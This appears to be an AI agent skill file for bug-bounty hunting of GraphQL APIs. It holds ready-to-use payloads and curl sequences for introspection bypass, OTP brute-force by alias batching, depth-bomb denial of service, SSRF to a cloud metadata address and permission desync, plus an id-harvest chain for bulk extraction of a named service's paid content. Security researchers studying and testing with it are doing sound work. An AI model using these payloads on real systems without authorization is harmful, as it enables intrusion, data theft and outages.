---
name: hunt-graphql
description: Hunting skill for graphql vulnerabilities. Built from 12 public bug bounty reports across IDOR via node() / GID, mutation IDOR including AI/LLM features, cross-tenant IDOR, SSRF via argument, batching-DoS, query-cost-bypass, SQLi via argument, broken-object-level-authz, auth-bypass via unscoped mutations, and PII exposure from missing field-level authz. Use when hunting graphql on any target.
sources: hackerone_public, github, gitlab_security
report_count: 26
---
> **appsec-fyi supplement (source-cited, 2026 CVEs):** `references/appsec-fyi-techniques.md` —
> additive per-class technique list from https://appsec.fyi. Owner methodology below still wins.

## Crown Jewel Targets

> **ABUSE MATRIX:** `references/graphql-abuse-matrix.md` — introspection-bypass ladder (partial
> `__type`, field-suggestion, alias, clairvoyance, APQ), depth/complexity/batching attack matrix
> (depth bomb, fragment spread, alias amplification, negative-first cost, EXNESS OOM), the
> batching-wins-vs-parallel-HTTP resolver table, directive/argument abuse, and escalation rungs.
> Read it after schema recon for the resource-abuse + introspection edges.

GraphQL vulnerabilities are high-value because the attack surface is both broad and deep — a single endpoint can expose entire data models, privilege escalation paths, and cross-API state confusion. Highest payouts occur in:

- **Platform APIs** (GitHub, Shopify, Stripe-tier targets) where GraphQL mutations interact with REST APIs managing the same resources
- **Race conditions between GraphQL mutations and REST endpoints** where state synchronization is non-atomic — these hit medium-to-high severity reliably
- **Authorization persistence bugs** where team/org/repo membership state is controlled by one API but readable/writable by another
- **B2B SaaS platforms** where one tenant affecting another via schema traversal = critical
- **Internal admin GraphQL endpoints** accidentally exposed to lower-privilege users

The GitHub reports demonstrate the crown jewel pattern: **privilege that should be revoked persists because two APIs disagree on ground truth**.

---

## Attack Surface Signals

**URL Patterns:**
```
/graphql
/api/graphql
/v1/graphql
/query
/gql
/graph
/api/v2/graphql
/internal/graphql
```

**Response Headers:**
```
Content-Type: application/json  (with query body)
X-Request-Id + no REST-style path params = likely GraphQL
```

**JavaScript Source Patterns:**
```js
// grep for these in JS bundles
"query {"
"mutation {"
"__typename"
"apollo"
"ApolloClient"
"graphql-tag"
"gql`"
"operationName"
"GRAPHQL_URI"
```

**Tech Stack Signals:**
- Apollo Server/Client in JS bundles
- Relay in React apps
- `graphene` or `strawberry` (Python), `graphql-ruby`, `gqlgen` (Go), `Lighthouse` (Laravel)
- POST requests with `{"query": "..."}` body shape in Burp history
- `__schema` or `__type` in any response = confirmed GraphQL

**Recon Sources:**
- `github.com` search: `"graphql" site:target.com`
- Wayback Machine for `/graphql` paths
- JS bundle scanning with `LinkFinder` or `getallurls`

---

## Step-by-Step Hunting Methodology

1. **Discover the endpoint** — spider JS bundles, check `/graphql`, `/api/graphql`, review Burp passive scan hits for `application/json` POST with query fields

2. **Test introspection** — send the full introspection query. Even if blocked, try field-level enumeration:
   ```graphql
   { __typename }
   ```
   If that returns, introspection may be partially blocked but the schema is discoverable

3. **Map the full schema** — use `InQL` (Burp extension) or `graphql-voyager` to visualize relationships. Specifically look for:
   - Mutations that modify ownership, permissions, or membership
   - Mutations that mirror REST API functionality

4. **Identify REST/GraphQL overlap** — document every resource that can be modified via BOTH REST and GraphQL. These dual-write surfaces are your RC targets.

5. **Test authorization boundaries per mutation** — replay mutations as lower-privilege users. Does the server enforce the same authz as the equivalent REST call?

6. **Hunt cross-API state desync** — find sequences where:
   - REST action should revoke access
   - GraphQL mutation re-grants or preserves it
   - Test the ordering: REST first → GraphQL → check state; then GraphQL first → REST → check state

7. **Test for persistent privilege after role/membership changes** — remove a user via REST, then call the corresponding GraphQL mutation for that resource. Query current state via both APIs and compare.

8. **Probe for IDOR in node IDs** — GraphQL global IDs often encode object type + ID. Swap IDs across object boundaries and across account contexts.

9. **Check batch query abuse** — send arrays of operations to bypass rate limiting or amplify enumeration.

10. **Document the exact reproduction chain** — for RC bugs, time-based steps must be reproducible deterministically.

---

## Payload & Detection Patterns

**Full Introspection Query:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

**Minimal Introspection Probe (bypass attempt):**
```graphql
{ __typename }
```

**curl introspection test:**
```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
```

**Field suggestion probe (bypass blind introspection blocks):**
```graphql
{ unknownField }
```
If response returns `"Did you mean: [realFieldName]?"` — schema is enumerable despite introspection being disabled.

**Batch query amplification:**
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

**Subscription hijacking (cross-user channel access):**
```graphql
subscription { messageAdded(channelId: "OTHER_USERS_CHANNEL") { content sender { email } } }
```
If subscriptions lack per-user scoping, an attacker can receive real-time events from another user's channel or conversation.

**Multi-code OTP/2FA brute-force via alias batching:**
```graphql
mutation { 
  v1: verifyOtp(code:"000001"){token} 
  v2: verifyOtp(code:"000002"){token}
  v3: verifyOtp(code:"000003"){token}
}
```
A single GraphQL request aliases the same mutation with different OTP codes. Combined with parallel HTTP, this defeats per-request rate limiting and compresses brute-force attempts into fewer network round-trips.

**RC desync test pattern (pseudo-sequence):**
```bash
# Step 1: Grant access via REST
curl -X PUT https://api.target.com/repos/ORG/REPO/teams/TEAM \
  -H "Authorization: token ADMIN_TOKEN" \
  -d '{"permission":"admin"}'

# Step 2: Revoke via REST  
curl -X DELETE https://api.target.com/repos/ORG/REPO/teams/TEAM \
  -H "Authorization: token ADMIN_TOKEN"

# Step 3: Re-assert via GraphQL mutation
curl -X POST https://api.target.com/graphql \
  -H "Authorization: bearer ATTACKER_TOKEN" \
  -d '{"query":"mutation { updateTeamsRepository(input: {repositoryId: \"REPO_ID\", teamId: \"TEAM_ID\", permission: ADMIN}) { clientMutationId } }"}'

# Step 4: Verify persistent access
curl https://api.target.com/repos/ORG/REPO/teams \
  -H "Authorization: token ADMIN_TOKEN"
```

**Grep for GraphQL in JS bundles:**
```bash
grep -Eo '(query|mutation|subscription)\s+\w+\s*[\({]' bundle.js
grep -Eo '"(/[a-z0-9/_-]*graphql[a-z0-9/_-]*)"' bundle.js
```

**GraphQL introspection & audit tooling:**
```bash
# InQL (Burp extension) — visualize GraphQL schema and relationships
inql -t https://target/graphql --generate-queries

# Clairvoyance — brute-force field names when introspection is disabled
python3 clairvoyance.py -u https://target/graphql -H "Authorization: Bearer TOKEN" -w wordlist.txt -o schema.json

# GraphQL Cop — scan for common misconfigurations (introspection enabled, no depth limits, etc.)
graphql-cop -t https://target/graphql
```

---

## Common Root Causes

1. **Dual-write without atomic locking** — developers implement the same resource modification in both REST and GraphQL independently. Neither system is aware the other exists for that resource. State updates aren't serialized or compared.

2. **Inconsistent authorization middleware** — REST endpoints go through one auth layer (e.g., middleware chain), GraphQL resolvers go through a different resolver-level check. The same action, different enforcement.

3. **GraphQL as "new REST" migration** — teams add GraphQL mutations that mirror REST functionality without auditing the permission model. The GraphQL version is less mature and skips checks the REST version accumulated over time.

4. **Introspection left on in production** — default framework settings (Apollo, Graphene) enable introspection in all environments. Developers forget to disable it, treating it as "just documentation."

5. **Node ID trust without re-authorization** — GraphQL global IDs (`base64("ObjectType:123")`) are decoded and trusted without verifying the requesting user has access to that specific object.

6. **Mutation side effects not mirrored** — when a REST action triggers cascading effects (e.g., team removal cascades to permission revocation), the GraphQL equivalent mutation doesn't trigger the same cascades.

---

## Bypass Techniques

**Defense: Introspection disabled**
- Bypass via field suggestion errors — send invalid field names and parse "did you mean X?" responses
- Use `clairvoyance` to brute-force field names against a wordlist
- Check JS bundles for hardcoded query strings that reveal the schema

**Defense: Depth limiting**
- Fragment spread to increase effective depth without hitting the limiter:
```graphql
fragment F on User { repos { teams { members { ...F } } } }
```

**Defense: Rate limiting per IP**
- Use batch operations (array of queries in one POST)
- Distribute across authenticated sessions

**Defense: Auth checks on mutations**
- Test with tokens at different privilege tiers (viewer, member, admin)
- Test unauthenticated — some mutations don't check session at all
- Test with tokens from *different organizations* — multi-tenant IDOR

**Defense: WAF blocking `__schema`**
- Alias the introspection field:
```graphql
{ s: __schema { t: types { n: name } } }
```
- Use HTTP parameter pollution or alternate content-type headers

**Defense: Operation whitelisting (persisted queries)**
- Check if the server falls back to ad-hoc queries when the `extensions.persistedQuery` hash mismatches
- Look for a non-whitelisted endpoint (dev, staging, internal proxy)

### Alias batching: when it wins races vs when it doesn't

A common claim is "alias batching defeats per-user rate limits and double-spend protections." Whether this actually wins depends on the **resolver execution model**:

| Resolver type | Behavior on aliased mutations | Alias batching wins races? |
|---|---|---|
| Multi-threaded / `DataLoader`-batched async | Aliases run concurrently, share state via batch | **YES** — single HTTP request can amplify a race-target N times |
| Single-threaded / single-DB-connection per request | Aliases run serially; first mutation closes the door | **NO** — combine with parallel HTTP |
| Distributed gateway (Apollo Federation) | Sub-queries dispatched concurrently to subgraphs | Depends on each subgraph |

**Verification example (single-threaded Flask + SQLite resolver):**
- 10 aliased `redeemCoupon` mutations in one request → only `r1` succeeds, r2-r10 fail with `already_redeemed`. Alias batching alone is insufficient.
- The same 10 mutations as **20 parallel HTTP POSTs** → 20 successes ($2000 from a $100 coupon).

**Operator rule:** treat alias batching as a single-RTT recon primitive. For race-target exploitation, combine with `hunt-race-condition`'s parallel-HTTP / Turbo Intruder single-packet attack. Verified in `docs/verification/phase2e-jwt-graphql-race.md` Test 11 vs Test 12.

---

## APQ / persisted-query APIs — the REST-shaped GraphQL most SPA targets actually run

Apollo SPAs frequently expose GraphQL **not** as `POST /graphql {"query":..}` but as a GET with the query
hash in the PATH and the query pre-registered server-side (Automatic Persisted Queries). Recognise it:

    GET /api/pub/gql/<skin>/<OperationName>/<sha256-of-query>?variables={"userId":".."}   <- public
    GET /api/auth/gql/<skin>/<OperationName>/<sha256>?mutation=1&variables={..}           <- authed

Probes that establish the shape:
- `POST /api/pub/gql/<skin>` (no Op/hash) -> **404** from the edge. The bare base is NOT the endpoint.
- `.../<Operation>/<hash>` -> 200 JSON; a bogus hash -> `{"errors":[{"message":"PersistedQueryNotFound"}]}`
  => **hash-locked**: only server-registered ops run, so introspection / custom queries are refused.

**Discover the registered ops** (sha256 is not guessable):
1. `waymore -i <domain> -mode U` / `gau` / Wayback — archived URLs leak the real `.../<Op>/<hash>` pairs.
2. A live logged-in session: `performance.getEntriesByType('resource').map(e=>e.name)` from the page lists
   every op name+hash, and the session user's OWN ids appear inside the `variables=` values.
3. The app's JS bundle (operation -> hash map).

**Mutations are GET too.** The authed mutation form is `.../<Op>/<hash>?mutation=1&variables={..}` and it is a
**GET**; the identical URL sent as POST returns **415 at the edge** whatever the Content-Type. Do not read that
415 as "blocked" — replay as GET before concluding anything.

**Errors leak the schema for free** (even when APQ blocks introspection): `Cannot query field "sponsor" on
type "INewsArticle". Did you mean "sponsors"?` and `Variable "$cityId" of required type "String!" was not
provided.` hand you type names, field names and argument types.

**The recurring bug in this shape — BOLA on a public-gql op that takes a caller-supplied id.** A resolver that
accepts e.g. `variables={"userId":<uuid>}` on the PUBLIC path with only an auth gate and no ownership check
lets **any authenticated user read any user's data**. Confirm with a 2-account differential: `A -> B's id`
returns B's data while `A -> A's id` returns A's (a real cross-user read, not an empty default); un-authed
with B's id returning `[]` while authed returns data means the gate is auth, not ownership.
**Discriminator, by-design vs oversight:** compare sibling ops. One that IGNORES `userId`/`id` and returns the
SESSION user's profile (`UserProfile`) is correctly scoped; a sibling that HONOURS the caller's id is the bug.
Report the contrast — it proves a per-resolver oversight rather than intended behaviour.

### The materialization tell — a read-by-id that hands back a DIFFERENT id

When account A requests account B's object by id and the response carries an id **that A never sent**, and the
object then shows up in **A's own list**, the resolver silently *cloned* B's object into A's scope. Seen on
AMBOSS 2026-10: `questionSession(eid:"<A1's session id>")` from A0 returned A1's title and question set under a
**fresh eid**, and A2 requesting the same input got a third eid — three accounts, one object.

Do not discount this as "I only got a copy":

- It is still an **unauthorized read of the victim's data** (title, question ids, and per-question result rows
  all came back). A copy is not a lesser disclosure when the copy contains the payload.
- The clone is **durable, re-readable evidence**: it sits in your own account list afterwards, so a triager can
  reproduce it without your session or your cookie jar.
- Prove ownership rather than inferring it: have the victim account read the **same input id** and assert it
  still returns their original id (unaffected) — that pair is the claim.

**Always try the sibling share/preview resolvers with NO auth header at all.** A resolver whose *purpose* is
sharing (`sharedXFromY`, `getSharedX`, `publicX`, `previewX`) is routinely left unauthenticated even when the
authenticated sibling is correctly scoped. On the same target
`sharedQuestionSessionFromQuestionSession(eid)` returned another user's session title **and every question id**
with no token whatsoever — and those child ids then feed the field-level leak above. Auth-gated sibling +
unauth share sibling is a very common pairing; check both before scoring.

## Field-level authorization asymmetry — the highest-yield GraphQL bug (check this FIRST)

Per-field authz is written field-by-field, so the bug is almost never "the whole type is open" — it is
**one field guarded, its sibling not**. The dev adds the check to the field someone complained about and
misses the copy next to it.

**The probe:** take any object type that has an access-controlled field, list its *siblings*, and request
every one of them **with no Authorization header at all**.

```
{  # no auth header
  questions(eids:["<known-id>"]) {
    content          # -> error access.no_valid_access  (guarded — good)
    publicContent    # -> FULL TEXT                    (unguarded — bug)
    contentPreview   # -> truncated preview
    hintContent      # -> FULL HINT                    (unguarded — bug)
    answers { letter content isCorrect }   # -> answer key exposed (unguarded — bug)
  }
}
```

**Tell-tale sibling naming that predicts the hole:** a guarded `content` next to a `publicContent`,
`freeContent`, `previewContent`, `legacyContent`, `contentRaw`, or `contentV2`. Whoever wrote the second
field assumed the first one's gate covered it. Same for `email` / `emailVerified` / `emailRaw`,
`price` / `basePrice` / `listPrice`, `isPaid` / `hasAccess` / `publiclyVisible`.

### The partial-data trap — an error in the response does NOT mean the field is protected

GraphQL returns `data` for everything that resolved and `errors` for what did not, **in the same HTTP 200**.
So a response that contains `access.no_valid_access` can still be carrying the leak in `data`:

```json
{"errors":[{"message":"access.no_valid_access","path":["questions",0,"content"]}],
 "data":{"questions":[{"content":null,
   "answers":[{"letter":"a","isCorrect":true},{"letter":"b","isCorrect":false}]}]}}
```

Reading this as "blocked" is the single easiest way to miss the bug. **Always inspect the resolved
sibling VALUES, not the presence of an error.** Same rule applies when checking a new field: compare the
unguarded field's value against what the guarded field returns for a *paying/privileged* account — if the
unguarded one equals the guarded one byte-for-byte, the gate is decorative. (AMBOSS 2026-10: `publicContent`
length == `content` length on 130/130 sampled questions from a 52,427-question pool.)

### Turning "needs an id" into mass exfiltration — the id-harvest + expansion chain

A field-level leak is only as big as your id supply. Two moves make it mass:

1. **Harvest ids from passive archives and the public crawl.** Object/session ids leak into URLs the app
   itself publishes or that got archived: `gau`/`waymore`/Wayback + `katana` over the app and marketing
   hosts surfaces paths like `/questions/<id>`, `/shared/questions/<id>`, `/session/<id>`, `/r/<id>`.
   One pass over one target yielded **230** public session ids and 5,082 `/questions/` URLs.
2. **Expand each harvested id through an unauthenticated "share"/"preview" resolver.** A resolver whose
   *purpose* is sharing (`sharedQuestionSessionFromQuestionSession`, `getSharedX`, `publicX`, `previewX`)
   is routinely left with no auth at all and hands back the child object ids:

   ```
   { sharedQuestionSessionFromQuestionSession(eid:"<harvested-session-id>") { title questions { eid } } }
   ```

   230 session ids → **5,245** unique question ids, no account. Feed those to the field-level leak and the
   whole paid corpus dumps.

**Checksummed ids are not a defence** — they only block *blind* enumeration. Random 6-char ids returned
`Invalid ID: riGp_5`; mutating one character of a valid id returned 0/69 valid. That is fine, because step 1
gets you real ids for free. Blast radius therefore scales with **published/archived URL surface**, not with
id entropy — say so in the report instead of downgrading on "the ids aren't guessable".

### Assert the FORMAT of any derived id list before you feed it (nearly shipped a wrong number)

A de-duped grep over a crawl produces **full paths**, not bare ids, and the two look interchangeable right
up until every request 400s. Hit live 2026-10 (AMBOSS): an early run harvested 230 session ids → 214 valid →
5,246 question ids; a *later* re-run over the same file reported **6 valid of 381** because an intervening
`gau --subs` job had overwritten `wayback_session_eids.txt` with raw `/questions/<eid>` lines. The resolver
rejected 375 of them on format, and the "collapsed" number looked like the original finding had evaporated.

Guard rails:
- Normalise at the point of use: `sed 's#^/questions/##; s#^/shared/questions/##' | grep -E '^[A-Za-z0-9_-]{6,12}$' | sort -u`
  before the request loop, and **print the element length histogram** (bare ids are all one length; a mixed
  histogram means the list still carries paths).
- Re-derived lists must land in a **new filename**; never overwrite the file a previous run consumed. When a
  re-run disagrees with an earlier count, suspect the *input file* before doubting the finding.
- Reconcile to a single number in triplicate (findings file ↔ evidence JSON ↔ report PDF) after any
  correction — a corrected number that exists in only one of the three is how the stale one ships.

**Persist BARE ids, and treat a disagreeing re-run as a tooling bug first.** An ids file that silently
holds whole URL paths (`/questions/<id>`) makes the next harvest return near-zero and looks like the
target hardened. Guard the shape (`awk '{print length($0)}' ids.txt | sort | uniq -c` — 20–28 char
entries mean paths leaked in), print the *tried / valid / harvested* triple every run, and when a
follow-up measurement contradicts a number you already published, diff the INPUT artifacts before
revising the claim. (Lived: a re-run reported 6/381 valid vs the true 214/230 → 5,246 — pure input-file
corruption; the original number was right.)

Worked example, exact requests and measured numbers: `references/field-level-authz-and-id-harvest-chain.md`.

### The leak is usually on the CHILD type, not the parent — enumerate every gated field's subtree

The sibling you miss is often one level down, on a different type reached through the gated object. Do not
stop at the guarded object's own fields: pull the full field list of **every type the gated object points
at**, and request all of them unauthenticated in one query.

Real case (AMBOSS 2026-10). The gate was on `Question.content`; the money leaked from the `Answer` child:

```
{ questions(eids:["<id>"]){                       # no auth header
    content            # -> access.no_valid_access   (guarded)
    publicContent      # -> FULL VIGNETTE
    hintContent        # -> FULL HINT
    labValuesSheet { content }        # -> FULL lab-values table      (child type, unguarded)
    answers {                          # <-- the Answer child type has NO gate at all
      letter content isCorrect
      explanationWhy explanationBut    # -> the per-option EXPLANATIONS: the thing customers pay for
      linkedArticleEid linkedParticleEid imageEid media rate
    }
} }
```

Measured on a 300-question sample, no auth: answer key 300/300, **full per-answer explanations 300/300**,
linked-article ids 300/300, ~5.3 MB of paid text from those 300 questions alone. The answer *key* is the
headline; the **explanations** are the actual product, and they are the more persuasive severity argument.

Naming that predicts a child-type hole: any field whose name pairs `explanation*` / `rationale` /
`discussion` / `notes` / `content` on a type the client never renders without a subscription. Also grab
`labValuesSheet`, `media`, `imageEid` — the "supporting assets" block is consistently unaudited.

### The discriminator that turns "maybe by design" into "oversight" — find the sibling that IS gated

Do not argue intent. Find, on the same endpoint, a field with the same *kind* of value that **is** correctly
guarded, and put the contrast in the report. AMBOSS: `Article.content` and `answers[].linkedArticle.content`
both returned `permission.user_is_not_authorized` unauthenticated, while `Question.publicContent` and
`Answer.explanationWhy` returned full text. That single contrast proves the check exists in the codebase and
was simply missed on the neighbours — it is the line that survives triage, and it is worth one extra probe
to obtain.

### A read that silently MATERIALISES a copy is a different bug from a plain read

Watch for a query that, given another user's object id, returns their object **and creates a copy in the
caller's account**. AMBOSS `questionSession(eid)`: account A0 read A1's session and got A1's title back under
a NEW eid that then appeared in A0's own session list (a third account got a third eid, same content). The
verification shape:

```
# run 1 (A0), run 2 (A2), run 3 (no auth) — each must return the VICTIM's title, not an empty default
{ questionSession(eid:"<victim-eid>"){ eid title questionCount } }
{ sharedQuestionSessionFromQuestionSession(eid:"<victim-eid>"){ title questions { eid } } }   # often no auth
```

Three things to establish before writing it up: (a) the victim's own read still returns their real eid;
(b) each reader gets a *distinct* new eid — that is the materialisation, and it is what makes the bug
"write as well as read"; (c) whether the copy carries the victim's **answer state**. In the AMBOSS case the
copied rows were all default/false, so leakage of the victim's actual answers was NOT provable and the
report said so. Do not upgrade to "leaks their answers" off a copied row that is just a default value.

### Pitfall: a recon file overwritten by a later command silently poisons the harvest

The id-harvest is a chain of files. If an earlier command is re-run with a slightly different pipeline it can
overwrite one with a DIFFERENT shape, and the consuming script fails silently instead of erroring — producing
a plausible-but-wrong number. Two guards: **assert the input shape at the top of every consuming script**
(strip the known prefix, fail loudly if `/` survives), and **report the count the script PRINTED, not `wc -l`
on the artefact**. Full transcript and the recovery command:
`references/field-level-authz-and-id-harvest-chain.md` → "Re-harvest hygiene".

## Gate 0 Validation

1. **What can the attacker DO right now?**
   Must be a concrete action: access data they shouldn't see, retain privileges after revocation, modify another user's resources. "The schema is visible" alone is not enough — what does the schema unlock?

2. **What does the victim LOSE?**
   Must be a real asset: data confidentiality, access control integrity, org security guarantees. For the RC pattern: an org admin loses the guarantee that removing a team revokes all access. That's a security contract violation.

3. **Can it be reproduced in 10 minutes from scratch?**
   For RC/desync bugs: write the exact curl sequence. Run it twice. If the privilege persists deterministically (not timing-dependent flakiness), it's reportable. If it requires millisecond timing luck, document the window and test on low-load times.

---

## Real Impact Examples

**Scenario A — Covert Persistent Admin After Team Removal (GitHub-pattern)**
An attacker who legitimately had admin access to a repository via team membership gets removed by the org admin through the REST API. The attacker, before removal completes, calls the `updateTeamsRepository` GraphQL mutation to re-associate their team with admin permissions. The REST removal and GraphQL re-grant create a desync where the UI shows the team as removed, but the GraphQL state preserves admin-level access. The attacker retains covert write access to the repository indefinitely — pushing code, reading secrets in CI/CD — without appearing in the team's member list. This persists through org audits.

**Scenario B — Covert Access via Repo Transfer Race (GitHub-pattern)**
An attacker with admin access initiates a repository transfer to another organization via the REST API. During or after the transfer, they invoke `updateTeamsRepository` on the now-transferred repo's ID. Because the GraphQL mutation doesn't validate current org ownership state consistently with the REST transfer event, the original attacker's team retains admin access on a repo now owned by a different organization. The receiving org has no visibility into this team association. The attacker can exfiltrate intellectual property from an org they have no legitimate relationship with.

**Scenario C — Introspection as Reconnaissance Prerequisite (Shopify-pattern)**
On a platform where introspection is intentionally enabled (per-program rules), a hunter maps the full schema and discovers undocumented mutations for `fulfillmentOrderMove` and `inventoryAdjust` that are not surfaced in public docs. These mutations accept merchant IDs as arguments with no scoping validation visible in the schema. This recon directly enables targeted IDOR testing against merchant-to-merchant data isolation — the introspection itself is zero-severity, but it is the entry point to critical findings.

---

## Disclosed Report Citations (Backfill +9 — 2019-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill beyond the original 3 internal references. Each is a distinct GraphQL subclass with a working PoC documented in the cited writeup.

4. **HackerOne — Confidential user-data exposure via GraphQL `User` type** ([H1 #489146](https://hackerone.com/reports/489146))
    - Subclass: broken field-level authorization (PII exposure)
    - Payload: direct `user(id:...)` query returning `email`, `backup_codes_hash`, `facebook_user_id`, `account_recovery_phone_number_verified_at`, `totp_enabled`
    - Root cause: backend migration introduced a GraphQL `User` type with no field-level authz; any authenticated user could enumerate PII of all users
    - Year: 2019 — **$20,000**, 1,028 upvotes

5. **HackerOne — `DestroyLlmConversation` mutation IDOR (Copilot pre-release)** ([H1 #2218334](https://hackerone.com/reports/2218334))
    - Subclass: mutation IDOR on AI/LLM feature
    - Payload: `mutation { destroyLlmConversation(input:{id:"<victim_conv_id>"}) { … } }`
    - Root cause: new LLM-conversation mutation shipped without authorization decorator; any user could destroy any conversation
    - Year: 2023 — caught pre-launch, no bounty (202 upvotes)

6. **Shopify — `BillingDocumentDownload` cross-tenant IDOR** ([H1 #2207248](https://hackerone.com/reports/2207248))
    - Subclass: IDOR on relay GID across tenants
    - Payload: `query { billingDocumentDownload(id:"gid://shopify/BillingInvoice/<other_shop_id>") { url } }`
    - Root cause: `BillingInvoice` resolver authorized the requester's shop but did not verify the invoice belonged to that shop
    - Year: 2024 — **$5,000**, 175 upvotes

7. **Shopify — Rate-limit bypass via negative cost** ([H1 #481518](https://hackerone.com/reports/481518))
    - Subclass: query-cost-calc abuse (sibling pattern to alias batching)
    - Payload: `query { products(first:-100) { … } }` — negative `first` produced a negative query-cost contribution, refilling the leaky-bucket each call
    - Root cause: query-cost calculator did not floor at zero; negative values subtracted from the consumed budget
    - Year: 2019 — **$1,000**

8. **Stripe — Cross-tenant IDOR via `UpdateAtlasApplicationPerson`** ([H1 #1066203](https://hackerone.com/reports/1066203))
    - Subclass: cross-tenant IDOR on mutation
    - Payload: `mutation { updateAtlasApplicationPerson(input:{personId:"<victim_person_id>", …}) }` — adding/modifying a co-founder on another merchant's Stripe Atlas application
    - Root cause: mutation scoped only to "is admin of some merchant," not "is admin of the merchant owning this person"
    - Year: 2020 — bounty undisclosed (resolved)

9. **EXNESS — SSRF in GraphQL `allTicks` query** ([H1 #1864188](https://hackerone.com/reports/1864188))
    - Subclass: SSRF via GraphQL argument
    - Payload: `query { allTicks(source:"http://169.254.169.254/latest/meta-data/") { … } }` — `source` arg fed into a server-side HTTP client
    - Root cause: GraphQL field accepted a URL arg and dereferenced it without scheme/host allowlist
    - Year: 2023 — **$3,000**, 249 upvotes

10. **EXNESS — GraphQL attribute-batching DoS** ([H1 #2293642](https://hackerone.com/reports/2293642))
    - Subclass: DoS via batching / deep-attribute amplification on unauth endpoint
    - Payload: single HTTP request containing N batched operations, each requesting deeply nested attribute trees, sustained until origin OOM
    - Root cause: no query-depth, query-complexity, or batch-size limits on unauthenticated `/graphql`
    - Year: 2024 — bounty undisclosed (resolved)

11. **GitLab — Malicious-runner attach via `runnerUpdate` (CVE-2023-2478)** ([Advisory](https://about.gitlab.com/releases/2023/05/05/critical-security-release-gitlab-15-11-2-released/))
    - Subclass: auth bypass on mutation / project-scope missing
    - Payload: `mutation { runnerUpdate(input:{id:"<attacker_runner_gid>", associatedProjects:["<victim_project_gid>"]}) }`
    - Root cause: `runnerUpdate` did not check that the caller had Maintainer on the target project — any user could bind their malicious runner and intercept CI jobs (build secrets, code execution)
    - Year: 2023 — Critical, CVSS 9.6 (H1 bounty undisclosed; GitLab Critical-tier typically $20k–$35k)

12. **AS Watson — Auth bypass via unrestricted `createAdminUser` mutation** ([HackerOne blog](https://www.hackerone.com/blog/how-graphql-bug-resulted-authentication-bypass))
    - Subclass: sensitive mutation reachable without authentication (introspection-aided discovery)
    - Payload: `mutation { createAdminUser(input:{email:"x@x", role:"ADMIN", password:"…"}) { token } }` invoked unauthenticated after schema enumeration via introspection
    - Root cause: schema lacked per-field authorization directives; `createAdminUser` exposed to public role
    - Year: 2023 — "Best Bug" prize at HackerOne Ambassador World Cup

---

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Introspection penuh: `{__schema{types{name}}}` | Peta lengkap permukaan |
| 2 | Batching & aliases: kirim 100 query dalam satu request | Bypass rate limit + brute cepat |
| 3 | Field suggestion error: salahkan nama field, baca saran server | Enumerasi skema tanpa introspection |
| 4 | Mutasi tanpa authz: panggil mutasi admin/`deleteUser` sebagai user biasa | BOLA-by-resolver |
| 5 | Nested query DoS + `__type` pada tipe internal | Info disclosure & resource |

**Aturan:** kalau salah satu probe belum dijalankan, kelas ini **belum boleh** ditulis
N/A. N/A harus menyebut probe mana yang sudah dicoba dan hasilnya.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** query/mutation tanpa batas

**Teknik pengembangan:** introspection -> schema; BOLA-by-resolver; alias -> rate-limit bypass

**Eskalasi ke:** `hunt-idor` · `hunt-data-exposure` · `hunt-auth-bypass`

**Depth target:** L2 -> L4

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.

## Related Skills & Chains

- **`hunt-idor`** — GraphQL `node(id:)` and global-relay-ID resolvers are IDOR factories: same shape, no scoping. Chain primitive: GraphQL introspection + IDOR (`node()` resolver) → cross-tenant data via base64-decoded type:id replay.
- **`hunt-api-misconfig`** — GraphQL mutations are mass-assignment magnets: clients send full input objects, server merges. Chain primitive: GraphQL mutation + extra fields (`isAdmin:true`, `verified:true`) → mass assignment → role escalation.
- **`hunt-business-logic`** — GraphQL aliases let you call the same mutation N times in one request, defeating per-request rate limits. Chain primitive: aliased mutation + business-logic flaw → coupon redeemed N times in single network round-trip.
- **`hunt-race-condition`** — GraphQL batching collapses N mutations into one HTTP packet — perfect single-packet race vehicle. Chain primitive: GraphQL batch + race → atomic-update missing → double-spend balance.
- **`security-arsenal`** — Load the GraphQL Payload Pack: introspection query, schema-suggestion error probe, alias amplification template, depth-bomb DoS payload, batch-attack template.
- **`triage-validation`** — Apply the Body-Diff Rule: introspection alone is informational; require a concrete cross-tenant read or mutation-with-impact PoC before submitting.
- **Unauth mutation sweep + federation error disclosure** — before hunting field-level bugs, sweep *every*
  mutation with no token (schema-driven, one probe each). Zero-argument mutations are the honest ones: with
  no input to validate, the gateway's auth decision is the only thing left in the path, so an auth-gated
  resolver answers `Not authorized` immediately — and the odd one out (`kycFlowStart` on api.blink.sv, 2026-10)
  answers with `SUBREQUEST_HTTP_ERROR … service: "blink-kyc"` + `Token is anon`, i.e. it reached the internal
  subgraph with no user context. That is LOW/INFO (internal service-name disclosure + inconsistent gating,
  no data/state impact — do not inflate it). Reference:
  `references/unauth-mutation-sweep-and-federation-errors.md`.

## 2026 sweep (dork pass 2026-10-26 — dari atlas lokal + advisori terverifikasi)

- **CVE-2026-19478 — GitLab GraphQL unauthenticated project deletion.** Satu mutasi GraphQL bisa menghapus proyek tanpa autentikasi.
  Lesson: **mutasi destruktif tanpa auth** adalah bentuk paling parah dari BOLA-by-resolver. Enumerasi semua mutasi dari introspection, lalu urutkan berdasarkan kata kunci destruktif (`delete`, `remove`, `destroy`, `purge`) dan uji tanpa sesi lebih dulu.
- **CVE-2026-11103 — GraphQL Batching Alias Rate Limit Bypass.** Alias + batching memungkinkan banyak operasi dalam satu request HTTP, melewati rate limit per-request.
  Lesson: rate limit yang dihitung **per HTTP request** tidak berarti apa-apa di GraphQL. Kalau endpoint punya rate limit, cek apakah itu per-operasi atau per-request — kalau per-request, batching adalah bypass dan itu sering menjadi prasyarat brute-force OTP/token.
